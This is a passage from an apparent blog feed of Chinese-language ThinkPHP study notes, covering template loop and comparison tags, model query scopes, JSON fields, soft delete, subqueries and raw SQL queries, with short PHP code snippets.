$key&#x3D;&gt;$obj&#125; </span><br><span class="line">&#123;$key&#125;.&#123;$obj.id&#125;.&#123;$obj.username&#125;(&#123;$obj.gender&#125;) .&#123;$obj.email&#125;&lt;br&gt; </span><br><span class="line">&#123;&#x2F;foreach&#125;</span><br><span class="line">其中$list （ :model(&#39;user&#39;)-&gt;all() ）是控制前端传递的数据集，$key 是 index 索引，$obj 是数据对象； </span><br></pre></td></tr></table></figure><p>volist 循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;volist name&#x3D;&#39;list&#39; id&#x3D;&#39;obj&#39;&#125;</span><br><span class="line">&#123;$key&#125;.&#123;$obj.id&#125;.&#123;$obj.username&#125;(&#123;$obj.gender&#125;) .&#123;$obj.email&#125;&lt;br&gt;</span><br><span class="line">&#123;&#x2F;volist&#125;</span><br><span class="line"> volist 中的 name 属性表示数据总集，id 属性表示当前循环的数据单条集</span><br><span class="line"> 使用 offset 属性和 length 属性从第 4 条开始显示 5 条，这里下标从 0 开始； （&#123;volist name&#x3D;&#39;list&#39; id&#x3D;&#39;obj&#39; offset&#x3D;&#39;3&#39; length&#x3D;&#39;5&#39;&#125; ）</span><br><span class="line"> 通过编译文件可以理解，mod&#x3D;2 表示索引除以 2 得到的余数是否等于 0 或 1； </span><br><span class="line"> 使用 empty 属性，可以当没有任何数据的时候，实现输出指定的提示； </span><br></pre></td></tr></table></figure><p>for 循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;for start&#x3D;&#39;1&#39; end&#x3D;&#39;100&#39; comparison&#x3D;&#39;&lt;&#39; step&#x3D;&#39;2&#39; name&#x3D;&#39;i&#39;&#125;</span><br><span class="line">&#123;$i&#125; </span><br><span class="line">&#123;&#x2F;for&#125;</span><br></pre></td></tr></table></figure><h2 id="模版的比较和定义标签"><a href="#模版的比较和定义标签" class="headerlink" title="模版的比较和定义标签"></a>模版的比较和定义标签</h2><h3 id="比较标签"><a href="#比较标签" class="headerlink" title="比较标签"></a>比较标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;eq name&#x3D;&#39;username&#39; value&#x3D;&#39;Mr.Lee&#39;&#125;</span><br><span class="line">李先生</span><br><span class="line">&#123;else&#x2F;&#125; </span><br><span class="line">王先生</span><br><span class="line">&#123;&#x2F;eq&#125;</span><br><span class="line">   相当于$username&#x3D;&#x3D;&#39;Mr.Lee&#39; 然后就数出李先生，不相等就是王先生。</span><br><span class="line">   属性 name 里是一个变量，$符号可加可不加；而 value 里是一个字符串,如果value中是一个变量值的话，就必须加$符号</span><br><span class="line">   &#123;equal&#125;效果相同</span><br></pre></td></tr></table></figure><p>不同标签表示不同的比较方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;gt&#125;(&gt;)、&#123;egt&#125;(&gt;&#x3D;)、&#123;lt&#125;(&lt;)、&#123;elt&#125;(&lt;&#x3D;)、&#123;heq&#125;(&#x3D;&#x3D;&#x3D;)和&#123;nheq&#125;(!&#x3D;&#x3D;)； </span><br></pre></td></tr></table></figure><p>统一使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;compare name&#x3D;&#39;username&#39; value&#x3D;&#39;Mr.Lee&#39; type&#x3D;&#39;eq&#39;&#125;</span><br><span class="line">两个值相等 </span><br><span class="line">&#123;&#x2F;compare&#125;</span><br><span class="line">输入到type就可以了</span><br></pre></td></tr></table></figure><h3 id="定义标签"><a href="#定义标签" class="headerlink" title="定义标签"></a>定义标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.定义变量</span><br><span class="line">&#123;assign name&#x3D;&#39;var&#39; value&#x3D;&#39;123&#39;&#125; &#x2F;&#x2F;也支持变量 value&#x3D;&#39;$name&#39; </span><br><span class="line">&#123;$var&#125;</span><br><span class="line">2.原生编码</span><br><span class="line">&#123;php&#125;</span><br><span class="line"> echo &quot;Hello&quot;;</span><br><span class="line">&#123;&#x2F;php&#125;</span><br><span class="line">中间不能使用模版函数，包括标签·语法</span><br><span class="line">3.支持嵌套功能标签</span><br><span class="line">&#123;foreach $list as $key&#x3D;&gt;$obj&#125; </span><br><span class="line">&#123;eq name&#x3D;&#39;obj.username&#39; value&#x3D;&#39;樱桃小丸子&#39;&#125; </span><br><span class="line">&#123;$key&#125;.&#123;$obj.id&#125;.&#123;$obj.username&#125;(&#123;$obj.gender&#125;) .&#123;$obj.email&#125;&lt;br&gt; </span><br><span class="line">&#123;&#x2F;eq&#125; </span><br><span class="line">&#123;&#x2F;foreach&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ThinkPhp-第4天&quot;&gt;&lt;a href=&quot;#ThinkPhp-第4天&quot; class=&quot;headerlink&quot; title=&quot;ThinkPhp - 第4天&quot;&gt;&lt;/a&gt;ThinkPhp - 第4天&lt;/h1&gt;&lt;h2 id=&quot;模版引擎和视图渲染-V&quot;&gt;&lt;a href=&quot;#模版引擎和视图渲染-V&quot; class=&quot;headerlink&quot; title=&quot;模版引擎和视图渲染(V)&quot;&gt;&lt;/a&gt;模版引擎和视图渲染(V)&lt;/h2&gt;&lt;p&gt;模版定位&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x2F;&amp;#x2F;指定模版&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      return $this-&amp;gt;fetch(&amp;#39;edit&amp;#39;);#当前模块&amp;#x2F;view&amp;#x2F;当前控制器名(小写)&amp;#x2F;当前操作(小写).html&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#x2F;&amp;#x2F;指定目录下的模版&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      return $this-&amp;gt;fetch(&amp;#39;public&amp;#x2F;edit&amp;#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#x2F;&amp;#x2F;指定模块下的模版&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      return $this-&amp;gt;fetch(&amp;#39;admin@public&amp;#x2F;edit&amp;#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#x2F;&amp;#x2F;view_path 下的模版&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      return $this-&amp;gt;fetch(&amp;#39;&amp;#x2F;edit&amp;#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#x2F;&amp;#x2F;助手函数view()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      return view(&amp;#39;&amp;#39;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;视图赋值和过滤&quot;&gt;&lt;a href=&quot;#视图赋值和过滤&quot; class=&quot;headerlink&quot; title=&quot;视图赋值和过滤&quot;&gt;&lt;/a&gt;视图赋值和过滤&lt;/h2&gt;</summary>
    
    
    
    <category term="编程" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
    <category term="ThinkPHP" scheme="http://example.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPhP-3</title>
    <link href="http://example.com/2020/09/20/ThinkPhP-3/"/>
    <id>http://example.com/2020/09/20/ThinkPhP-3/</id>
    <published>2020-09-20T14:50:47.000Z</published>
    <updated>2020-09-21T12:46:18.501Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ThinkPhp-3"><a href="#ThinkPhp-3" class="headerlink" title="ThinkPhp-3"></a>ThinkPhp-3</h3><h2 id="模型查询范围和输出"><a href="#模型查询范围和输出" class="headerlink" title="模型查询范围和输出"></a>模型查询范围和输出</h2><h3 id="一、模型查询"><a href="#一、模型查询" class="headerlink" title="一、模型查询"></a>一、模型查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function scopeGenderMale($query) &#123; </span><br><span class="line">    $query-&gt;where(&#39;gender&#39;, &#39;男&#39;) </span><br><span class="line">    -&gt;field(&#39;id,username,gender,email&#39;)-&gt;limit(5); </span><br><span class="line">    &#125;</span><br><span class="line">方法名必须以scope开头</span><br><span class="line">调用：</span><br><span class="line">$result &#x3D; UserModel::scope(&#39;gendermale&#39;)-&gt;select();</span><br><span class="line">&#x2F;&#x2F;$result &#x3D; UserModel::gendermale()-&gt;select(); </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function scopeEmailLike($query, $value) </span><br><span class="line">&#123; $query-&gt;where(&#39;email&#39;, &#39;like&#39;, &#39;%&#39;.$value.&#39;%&#39;); &#125;</span><br><span class="line">public function scopePriceGreater($query, $value)</span><br><span class="line">&#123; $query-&gt;where(&#39;price&#39;, &#39;&gt;&#39;, 80); &#125;</span><br><span class="line">$result &#x3D; UserModel::emailLike(&#39;xiao&#39;)-&gt;priceGreater(80) -&gt;select();</span><br></pre></td></tr></table></figure><p><strong>只能使用 find()和 select()两种方法</strong></p><p>全局范围查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected function base($query) &#123; $query-&gt;where(&#39;status&#39;, 1); &#125;</span><br></pre></td></tr></table></figure><p>开关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UserModel::useGlobalScope(false)</span><br></pre></td></tr></table></figure><h3 id="二、模型输出"><a href="#二、模型输出" class="headerlink" title="二、模型输出"></a>二、模型输出</h3><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function view() &#123; </span><br><span class="line">$user &#x3D; UserModel::get(21); </span><br><span class="line">$this-&gt;assign(&#39;user&#39;, $user); </span><br><span class="line">return $this-&gt;fetch(); &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">3. 使用 toArray()方法，将对象按照数组的方式输出； </span><br><span class="line">$user &#x3D; UserModel::get(21); print_r($user-&gt;toArray());</span><br><span class="line">4. 和之前的数据集一样，它也支持 hidden、append、visible 等方法； </span><br><span class="line">print_r($user-&gt;hidden([&#39;password,update_time&#39;])-&gt;toArray());</span><br><span class="line">5. toArray()方法也支持 all()和 select()等列表数据； </span><br><span class="line">print_r(UserModel::select()-&gt;toArray());</span><br><span class="line">6. 使用 toJson()方法将数据对象进行序列化操作，也支持 hidden 等方法； </span><br><span class="line">print_r($user-&gt;toJson());</span><br></pre></td></tr></table></figure><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><h3 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data &#x3D; [ &#39;username&#39; &#x3D;&gt; &#39;辉夜&#39;, &#39;password&#39; &#x3D;&gt; &#39;123&#39;, &#39;gender&#39; &#x3D;&gt; &#39;女&#39;, &#39;email&#39; &#x3D;&gt; &#39;huiye@163.com&#39;, &#39;price&#39; &#x3D;&gt; 90, &#39;details&#39; &#x3D;&gt; &#39;123&#39;, &#39;uid&#39; &#x3D;&gt; 1011, &#39;status&#39; &#x3D;&gt; 1, &#39;list&#39; &#x3D;&gt; [&#39;username&#39;&#x3D;&gt;&#39;辉夜&#39;, &#39;gender&#39;&#x3D;&gt;&#39;女&#39;, &#39;email&#39;&#x3D;&gt;&#39;huiye@163.com&#39;], ];</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;insert($data);</span><br></pre></td></tr></table></figure><p>将json数据写入文本类型，可以转换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user &#x3D; Db::name(&#39;user&#39;)-&gt;json([&#39;list&#39;,&#39;details&#39;]) -&gt;where(&#39;id&#39;, 173)-&gt;find()</span><br></pre></td></tr></table></figure><p>照样可以输出json数据格式</p><h3 id="按照json数据段中的数据进行查找"><a href="#按照json数据段中的数据进行查找" class="headerlink" title="按照json数据段中的数据进行查找"></a>按照json数据段中的数据进行查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user &#x3D; Db::name(&#39;user&#39;)-&gt;json([&#39;list&#39;,&#39;details&#39;])-&gt; </span><br><span class="line">where(&#39;list-&gt;username&#39;, &#39;辉夜&#39;)-&gt;find();</span><br></pre></td></tr></table></figure><p>完全修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果想完全修改 json 数据，可以使用如下的方式实现： </span><br><span class="line">$data[&#39;list&#39;] &#x3D; [&#39;username&#39;&#x3D;&gt;&#39;李白&#39;, &#39;gender&#39;&#x3D;&gt;&#39;男&#39;]; Db::name(&#39;user&#39;)-&gt;json([&#39;list&#39;]) -&gt;where(&#39;id&#39;, 174)-&gt;update($data);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>部分修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data[&#39;list-&gt;username&#39;] &#x3D; &#39;李黑&#39;;</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;json([&#39;list&#39;]) -&gt;where(&#39;id&#39;, 174)-&gt;update($data);</span><br></pre></td></tr></table></figure><h3 id="模型json"><a href="#模型json" class="headerlink" title="模型json"></a>模型json</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected $json &#x3D; [&#39;details&#39;, &#39;list&#39;];</span><br></pre></td></tr></table></figure><p>对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$list &#x3D; new \StdClass();</span><br><span class="line">$list-&gt;username &#x3D; &#39;辉夜&#39;;</span><br><span class="line">$list-&gt;gender &#x3D; &#39;女&#39;; </span><br><span class="line">$list-&gt;email &#x3D; &#39;huiye@163.com&#39;;</span><br><span class="line">$list-&gt;uid &#x3D; 1011; </span><br><span class="line">$user-&gt;list &#x3D; $list;</span><br></pre></td></tr></table></figure><p>通过 json 的数据查询，获取一条数据；</p><p> <code>$user = UserModel::where(&#39;list-&gt;username&#39;, &#39;辉夜&#39;)-&gt;find(); return $user-&gt;list-&gt;email;</code></p><p> 更新修改 json 数据，直接通过对象方式即可； </p><p><code>$user = UserModel::get(179); $user-&gt;list-&gt;username = &#39;李白&#39;; $user-&gt;save()</code></p><h2 id="软删除"><a href="#软删除" class="headerlink" title="软删除"></a>软删除</h2><p>软删除：并不是真的将数据库中的数据进行删除，而是打上标签</p><h3 id="数据库软删除"><a href="#数据库软删除" class="headerlink" title="数据库软删除"></a>数据库软删除</h3><p>我们需要在数据表创建一个 delete_time，默认为 NULL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;, 192) -&gt;</span><br><span class="line">useSoftDelete(&#39;delete_time&#39;, date(&#39;Y-m-d H:i:s&#39;))# 一个参数是时间，一个是当前时间</span><br><span class="line">-&gt;delete(); </span><br><span class="line">return Db::getLastSql(); 执行的真实语句是update</span><br></pre></td></tr></table></figure><h3 id="模型段数据删除"><a href="#模型段数据删除" class="headerlink" title="模型段数据删除"></a>模型段数据删除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">模型端</span><br><span class="line">use SoftDelete;</span><br><span class="line">protected $deleteTime &#x3D; &#39;delete_time&#39;;</span><br><span class="line">自动在所有的数据查询中加选择语句</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user &#x3D; UserModel::withTrashed()-&gt;select();  取消屏蔽</span><br><span class="line">$user &#x3D; UserModel::onlyTrashed()-&gt;select(); 只查看屏蔽</span><br></pre></td></tr></table></figure><p>恢复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user &#x3D; UserModel::onlyTrashed()-&gt;find();</span><br><span class="line">$user-&gt;restore()</span><br></pre></td></tr></table></figure><p>真正的删除（要先找到，再删除）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user &#x3D; UserModel::onlyTrashed()-&gt;get(193); $user-&gt;restore(); $user-&gt;delete(true);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;ThinkPhp-3&quot;&gt;&lt;a href=&quot;#ThinkPhp-3&quot; class=&quot;headerlink&quot; title=&quot;ThinkPhp-3&quot;&gt;&lt;/a&gt;ThinkPhp-3&lt;/h3&gt;&lt;h2 id=&quot;模型查询范围和输出&quot;&gt;&lt;a href=&quot;#模型查询范围和输出&quot; class=&quot;headerlink&quot; title=&quot;模型查询范围和输出&quot;&gt;&lt;/a&gt;模型查询范围和输出&lt;/h2&gt;&lt;h3 id=&quot;一、模型查询&quot;&gt;&lt;a href=&quot;#一、模型查询&quot; class=&quot;headerlink&quot; title=&quot;一、模型查询&quot;&gt;&lt;/a&gt;一、模型查询&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;public function scopeGenderMale($query) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $query-&amp;gt;where(&amp;#39;gender&amp;#39;, &amp;#39;男&amp;#39;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -&amp;gt;field(&amp;#39;id,username,gender,email&amp;#39;)-&amp;gt;limit(5); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;方法名必须以scope开头&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;调用：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$result &amp;#x3D; UserModel::scope(&amp;#39;gendermale&amp;#39;)-&amp;gt;select();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x2F;&amp;#x2F;$result &amp;#x3D; UserModel::gendermale()-&amp;gt;select(); &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;public function scopeEmailLike($query, $value) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123; $query-&amp;gt;where(&amp;#39;email&amp;#39;, &amp;#39;like&amp;#39;, &amp;#39;%&amp;#39;.$value.&amp;#39;%&amp;#39;); &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;public function scopePriceGreater($query, $value)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123; $query-&amp;gt;where(&amp;#39;price&amp;#39;, &amp;#39;&amp;gt;&amp;#39;, 80); &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$result &amp;#x3D; UserModel::emailLike(&amp;#39;xiao&amp;#39;)-&amp;gt;priceGreater(80) -&amp;gt;select();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;只能使用 find()和 select()两种方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;全局范围查询&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;protected function base($query) &amp;#123; $query-&amp;gt;where(&amp;#39;status&amp;#39;, 1); &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;开关&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;UserModel::useGlobalScope(false)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;二、模型输出&quot;&gt;&lt;a href=&quot;#二、模型输出&quot; class=&quot;headerlink&quot; title=&quot;二、模型输出&quot;&gt;&lt;/a&gt;二、模型输出&lt;/h3&gt;</summary>
    
    
    
    <category term="编程" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
    <category term="ThinkPHP" scheme="http://example.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP-2</title>
    <link href="http://example.com/2020/09/18/ThinkPHP-2/"/>
    <id>http://example.com/2020/09/18/ThinkPHP-2/</id>
    <published>2020-09-18T00:07:33.000Z</published>
    <updated>2020-09-18T15:41:25.801Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPhP学习第二天"><a href="#ThinkPhP学习第二天" class="headerlink" title="ThinkPhP学习第二天"></a>ThinkPhP学习第二天</h1><h2 id="聚合、原生、子查询"><a href="#聚合、原生、子查询" class="headerlink" title="聚合、原生、子查询"></a>聚合、原生、子查询</h2><h3 id="一、聚合查询"><a href="#一、聚合查询" class="headerlink" title="一、聚合查询"></a>一、聚合查询</h3><p>查询数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;count(&#39;uid&#39;);</span><br><span class="line">uid如果不加，就是全查询</span><br></pre></td></tr></table></figure><p>最大/小值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;max&#x2F;min(&#39;price&#39;，可选参数);</span><br><span class="line">取值为bool，可以判断整型还是浮点型</span><br></pre></td></tr></table></figure><p>平均值和总和同SQL</p><a id="more"></a><h3 id="二、子查询"><a href="#二、子查询" class="headerlink" title="二、子查询"></a>二、子查询</h3><p>1.fetchSql（）可以不执行sql，而返回sql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$subQuery &#x3D; Db::name(&#39;user&#39;)-&gt;fetchSql(true)-&gt;select()</span><br></pre></td></tr></table></figure><p>2.bulidsql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$subQuery &#x3D; Db::name(&#39;user&#39;)-&gt;buildSql(true);</span><br><span class="line">自动加括号</span><br></pre></td></tr></table></figure><p>3.拼装子查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$subQuery &#x3D; Db::name(&#39;two&#39;)-&gt;field(&#39;uid&#39;)-&gt;where(&#39;gender&#39;,&#39;男&#39;)-&gt;buildSql(true);</span><br><span class="line">$result &#x3D; Db::name(&#39;one&#39;)-&gt;where(&#39;id&#39;,&#39;exp&#39;,&#39;in&#39;.$subQuery)-&gt;select();</span><br><span class="line">return json($result);</span><br></pre></td></tr></table></figure><p>in 查询需要使用exp拼接</p><p>4.闭包查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;one&#39;)-&gt;where(&#39;id&#39;, &#39;in&#39;, function ($query) &#123; $query-&gt;name(&#39;two&#39;)-&gt;where(&#39;gender&#39;, &#39;男&#39;)-&gt;field(&#39;uid&#39;); &#125;)-&gt;select();</span><br></pre></td></tr></table></figure><h3 id="三、原生查询"><a href="#三、原生查询" class="headerlink" title="三、原生查询"></a>三、原生查询</h3><ol><li>使用 query()方法，进行原生 SQL 查询，适用于读取操作，SQL 错误返回 false； Db::query(‘select * from tp_user’);</li><li>使用 execute 方法，进行原生 SQL 更新写入等，SQL 